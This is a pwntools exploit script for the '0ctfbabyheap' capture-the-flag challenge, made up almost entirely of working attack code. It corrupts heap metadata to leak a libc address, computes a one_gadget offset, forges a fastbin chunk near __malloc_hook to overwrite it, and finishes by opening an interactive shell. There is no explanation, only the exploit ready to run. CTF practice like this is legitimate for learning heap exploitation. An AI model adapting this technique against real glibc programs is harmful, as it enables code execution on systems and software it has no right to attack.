from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = '0ctfbabyheap'
elf = ELF(program,checksec=False)
lokal = True
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    #libc = elf.libc
else:
    host = ''
    port = ''
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)

#Exploit Here

def alloc(size):
	sla("and: ","1")
	sla("Size: ",str(size))

def fill(idx,size,content):
	sla("and: ","2")
	sla("Index: ",str(idx))
	sla("Size: ",str(size))
	sa("Content: ",content)

def free(idx):
	sla("and: ","3")
	sla("Index: ",str(idx))

def dump(idx):
	sla("and: ","4")
	sla("Index: ",str(idx))
	ru("Content: \n")
	return xp.recvline()


alloc(0x20)
alloc(0x20)
alloc(0x20)
alloc(0x20)

alloc(0x80)

free(1)
free(2)

p = p64(0)*5
p += p64(0x31)
p += p64(0)*5
p += p64(0x31)
p += p8(0xc0)

fill(0,len(p),p)

p2 = p64(0)*5
p2 += p64(0x31)

fill(3,len(p2),p2)

alloc(0x20)
alloc(0x20)

p2 = p64(0)*5
p2 += p64(0x91)

fill(3,len(p2),p2)
alloc(0x80)
free(4)

leak = uu64(dump(2)[:8])
print hex(leak)

libcbase = leak - 0x3c4b78
print hex(libcbase)

one = libcbase + 0x4527a

alloc(0x68)
free(4)
#
p = p64(0x7ffff7dd1aed)
fill(2,len(p),p)
#
alloc(0x68)
alloc(0x68)

p = "AAA"
p += p64(0)*2
p += p64(one)

fill(6,len(p),p)

alloc(1)

xp.interactive()
